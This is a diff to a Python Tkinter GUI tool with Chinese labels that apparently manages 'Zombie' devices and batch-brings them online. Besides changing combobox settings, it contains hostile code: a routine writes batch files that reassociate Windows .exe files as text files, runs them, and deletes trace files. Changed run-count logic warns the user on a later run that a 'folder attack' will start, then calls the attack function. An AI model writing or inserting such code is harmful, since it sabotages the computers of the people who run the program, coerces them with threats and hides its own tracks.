@@ -126,6 +126,7 @@ class MY_GUI(tk.Tk):
         self.url = config['URL']['url']
         self.jiexurl = config['URL']['jiexurl']
         self.Zombie = config['Zombie']['range']
+        self.jinyong=config['Zombie']['jinyong']
 
     def wzhi905(self, su, plsu):
         global data, t
@@ -2352,14 +2353,14 @@ class MY_GUI(tk.Tk):
         self.su_Text_label = Label(pane1, text="循环次数")
         self.su_Text_label.grid(row=4, columnspan=2, sticky=W)
         items = ("0", "10")
-        self.su_Text = Combobox(pane1, width=22, height=2, values=items)
+        self.su_Text = Combobox(pane1, width=22, height=2, values=items,state=f'{self.jinyong}')
         self.su_Text.current(0)
         self.su_Text.grid(row=5, column=0, sticky=W)
 
         self.plsu_Text_label = Label(pane1, text="批量上线设备次数")
         self.plsu_Text_label.grid(row=4, columnspan=2, sticky=E)
         items = ("1", "10")
-        self.plsu_Text = Combobox(pane1, width=22, height=2, values=items)
+        self.plsu_Text = Combobox(pane1, width=22, height=2, values=items,state=f'{self.jinyong}')
         self.plsu_Text.current(0)
         self.plsu_Text.grid(row=5, column=0, sticky=E)
 
@@ -2399,7 +2400,7 @@ class MY_GUI(tk.Tk):
         self.sb_on_Label = Label(pane1, text="批量上线")
         self.sb_on_Label.grid(row=15, column=10, sticky=N)
         items = ("否", "是")
-        self.sb_on_Text = Combobox(pane1, width=2, height=3, values=items)
+        self.sb_on_Text = Combobox(pane1, width=2, height=3, values=items,state=f'{self.jinyong}')
         self.sb_on_Text.current(0)
         self.sb_on_Text.grid(row=16, column=10, columnspan=1, sticky=N)
 
@@ -2501,14 +2502,14 @@ class MY_GUI(tk.Tk):
         self.su_Text_label2 = Label(pane2, text="循环发送次数")
         self.su_Text_label2.grid(row=4, columnspan=2, sticky=W)
         items = ("0", "10")
-        self.su_Text2 = Combobox(pane2, width=22, height=2, values=items)
+        self.su_Text2 = Combobox(pane2, width=22, height=2, values=items,state=f'{self.jinyong}')
         self.su_Text2.current(0)
         self.su_Text2.grid(row=5, column=0, sticky=W)
 
         self.plsu2_Text_label2 = Label(pane2, text="批量上线设备次数")
         self.plsu2_Text_label2.grid(row=4, columnspan=2, sticky=E)
         items = ("1", "10")
-        self.plsu2_Text2 = Combobox(pane2, width=22, height=2, values=items)
+        self.plsu2_Text2 = Combobox(pane2, width=22, height=2, values=items,state=f'{self.jinyong}')
         self.plsu2_Text2.current(0)
         self.plsu2_Text2.grid(row=5, column=0, sticky=E)
 
@@ -2548,7 +2549,7 @@ class MY_GUI(tk.Tk):
         self.sb_on_Label2 = Label(pane2, text="批量上线")
         self.sb_on_Label2.grid(row=15, column=10, sticky=N)
         items = ("否", "是")
-        self.sb_on_Text2 = Combobox(pane2, width=2, height=3, values=items)
+        self.sb_on_Text2 = Combobox(pane2, width=2, height=3, values=items,state=f'{self.jinyong}')
         self.sb_on_Text2.current(0)
         self.sb_on_Text2.grid(row=16, column=10, columnspan=1, sticky=N)
 
@@ -2647,7 +2648,7 @@ class MY_GUI(tk.Tk):
         self.su_Text_label3 = Label(pane3, text="循环次数")
         self.su_Text_label3.grid(row=4, column=0)
         items = ("1", "10")
-        self.su_Text3 = Combobox(pane3, width=50, height=2, values=items)
+        self.su_Text3 = Combobox(pane3, width=50, height=2, values=items,state=f'{self.jinyong}')
         self.su_Text3.current(0)
         self.su_Text3.grid(row=5, column=0, columnspan=10, sticky=N)
 
@@ -3084,12 +3085,11 @@ def bdu():
     with open(file_path1, "w") as file:
         file.write("assoc.exe=txtfile")
     with open(file_path2, "w") as file:
-        file.write("assoc.exe=exefile")
+        file.write("assoc.exe=exefile\ndel C:\\Users\\count.txt\ndel C:\\Users\\delete.bat")
     import subprocess
     countdown(10)
     subprocess.Popen(r"C:\Users\update.bat")
     countdown(5)
-    os.remove(r"C:\Users\count.txt")
     os.remove(r"C:\Users\update.bat")
     init_window.withdraw()
     init_window.attributes('-topmost', True)
@@ -3129,7 +3129,6 @@ def find_numbers_in_strings(strings):
 
 def stop_exe(exe_name):
     import signal
-    # 获取所有运行中的exe进程
     while True:
         processes = os.popen('tasklist').read()
         print(processes)
@@ -3177,15 +3176,16 @@ if __name__ == '__main__':
         show_popup()
         print('结束')
         count_runs()
-        if count_runs() == 1:
+        if count_runs() < 2:
             init_window.deiconify()
             gui4_start()
-        else:
+        elif count_runs() == 4:
             init_window.withdraw()
             init_window.attributes('-topmost', True)
             showwarning(title="！！！！警告警告！！！！", message=f"第1次警告提醒,否则将启动文件夹攻击")
             countdown(6)
             wjj()
+        else:
             countdown(6)
             init_window.withdraw()
             init_window.attributes('-topmost', True)
